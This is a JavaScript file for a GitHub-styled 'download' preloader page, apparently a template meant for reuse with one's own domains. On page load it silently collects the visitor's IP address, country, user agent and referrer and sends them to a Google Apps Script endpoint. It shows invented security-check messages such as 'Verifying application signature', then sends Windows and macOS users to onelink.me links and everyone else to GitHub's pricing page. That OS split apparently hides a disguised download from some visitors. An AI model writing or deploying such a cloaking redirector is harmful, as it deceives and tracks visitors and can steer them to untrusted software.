/* ================== CONFIG ================== */
// Куда вести по ОС (замени на свои домены, без завершающего /)
const DEST = {
  windows:  "https://pwin.onelink.me/zmFc/dt38769z",
  macos:    "https://pmacos.onelink.me/m5yY/q5vbjgvh",
  ios:      "https://github.com/pricing",
  android:  "https://github.com/pricing",
  linux:    "https://github.com/pricing",
  other:    "https://github.com/pricing"
};

// Твой Google Apps Script Web App URL (/exec)
const APP_URL = "https://script.google.com/macros/s/AKfycbwip_VgPEumBXeWuX_OEX6huIMHfPXidiweHpHR-fGUQIqpcR-mAMAHC1JCUQyJne3n0Q/exec";

// Задержка после 100% до редиректа (мс)
const REDIRECT_DELAY_MS = 200;

/* ================== HELPERS ================== */
const qs = new URLSearchParams(location.search);
const hardOs = (qs.get('os') || '').toLowerCase();

function parseParams(str) {
    const out = {}; 
    if(!str) return out;
    const s = str.replace(/^[?#]+/,''); 
    if(!s) return out;
    
    for(const pair of s.split('&')){ 
        if(!pair) continue;
        const [k,v] = pair.split('=');
        const key = decodeURIComponent((k||'').trim());
        const val = v===undefined ? '1' : decodeURIComponent((v||'').trim());
        if(key) out[key]=val;
    } 
    return out;
}

function getOffer() {
    const q = parseParams(location.search);
    const h = parseParams(location.hash);
    return q.offername || q.offer || q.offer_name || h.offername || h.offer || h.offer_name || '';
}

function keepQueryAndHash(base) { 
    return base + location.search + (location.hash||''); 
}

// OS detect
function detectOS() {
    if (['windows','macos','ios','android','linux','other'].includes(hardOs)) return hardOs;
    
    const uad = navigator.userAgentData;
    if (uad && uad.platform) {
        const p = uad.platform.toLowerCase();
        if (p.includes('windows')) return 'windows';
        if (p.includes('mac'))     return 'macos';
        if (p.includes('ios'))     return 'ios';
        if (p.includes('android')) return 'android';
        if (p.includes('linux'))   return 'linux';
    }
    
    const ua = navigator.userAgent||'';
    if (/iPhone|iPad|iPod/i.test(ua)) return 'ios';
    if (/Android/i.test(ua))          return 'android';
    if (/Windows NT/i.test(ua))       return 'windows';
    if (/Macintosh;.*Mac OS X/i.test(ua)) return 'macos';
    if (/Linux/i.test(ua))            return 'linux';
    
    return 'other';
}

// ==== NEW: get IP & Geo on the client ====
async function getIP() {
    try {
        const r = await fetch("https://api64.ipify.org?format=json", {cache:"no-store"});
        const j = await r.json();
        return j.ip || "";
    } catch {
        return "";
    }
}

async function getGeo(ip) {
    try {
        if(!ip) return {country:"", countryCode:""};
        const r = await fetch(`https://ipapi.co/${ip}/json/`, {cache:"no-store"});
        const j = await r.json();
        return { country: j.country_name || "", countryCode: j.country || "" };
    } catch {
        return {country:"", countryCode:""};
    }
}

// non-blocking лог через <img>
function logRedirect({os, offer, targetUrl, ip, country, countryCode}) {
    try {
        const payload = {
            ip, 
            country, 
            countryCode,
            userAgent: navigator.userAgent,
            referrer: document.referrer || "",
            buttonId: "preloaderRedirect",
            extra: `os=${os}; to=${new URL(targetUrl).host}`,
            offer
        };
        const q = new URLSearchParams({ p: JSON.stringify(payload) }).toString();
        (new Image(1,1)).src = APP_URL + "?" + q + "&_t=" + Date.now();
    } catch(_) {
        // Ignore errors
    }
}

/* ================== UI FUNCTIONS ================== */
function createCommitGrid() {
    const grid = document.getElementById('commitGrid');
    const cellCount = 70;
    
    for (let i = 0; i < cellCount; i++) {
        const cell = document.createElement('div');
        cell.classList.add('commit-cell');
        if (Math.random() > 0.4) cell.style.opacity = Math.random() * 0.5 + 0.3;
        grid.appendChild(cell);
    }
}

function animateProgress(targetUrl, os, offer) {
    const progress = document.getElementById('progress');
    const percentage = document.getElementById('percentage');
    const status = document.getElementById('status');
    const commitCells = document.querySelectorAll('.commit-cell');

    const statusMessages = [
        "Initializing security protocols",
        "Verifying application signature",
        "Establishing secure connection",
        "Preparing download session",
        "Finalizing redirect sequence"
    ];

    let progressValue = 0;
    let currentStatus = 0;

    const interval = setInterval(() => {
        progressValue += 1;
        progress.style.width = `${progressValue}%`;
        percentage.textContent = `${progressValue}%`;

        if (progressValue === 20 && currentStatus === 0) { 
            status.textContent = statusMessages[1]; 
            currentStatus = 1; 
        }
        if (progressValue === 45 && currentStatus === 1) { 
            status.textContent = statusMessages[2]; 
            currentStatus = 2; 
        }
        if (progressValue === 70 && currentStatus === 2) { 
            status.textContent = statusMessages[3]; 
            currentStatus = 3; 
        }
        if (progressValue === 90 && currentStatus === 3) { 
            status.textContent = statusMessages[4]; 
            currentStatus = 4; 
        }

        if (progressValue % 5 === 0) {
            const randomCell = commitCells[Math.floor(Math.random() * commitCells.length)];
            if (randomCell) { 
                randomCell.classList.add('active'); 
                setTimeout(() => randomCell.classList.remove('active'), 1000); 
            }
        }

        if (progressValue >= 100) {
            clearInterval(interval);
            setTimeout(() => { 
                location.replace(targetUrl); 
            }, REDIRECT_DELAY_MS);
        }
    }, 40);
}

// ==== INIT: получаем IP/Geo → логируем → запускаем анимацию/редирект ====
window.addEventListener('load', async () => {
    createCommitGrid();

    const os = detectOS();
    const offer = getOffer();
    const base = DEST[os] || DEST.other || location.origin;
    const targetUrl = keepQueryAndHash(base);

    // берём IP/Geo; если что-то блокируется — всё равно уйдём с пустыми полями
    const ip = await getIP();
    const geo = await getGeo(ip);

    logRedirect({
        os, 
        offer, 
        targetUrl,
        ip,
        country: geo.country,
        countryCode: geo.countryCode
    });

    animateProgress(targetUrl, os, offer);
});
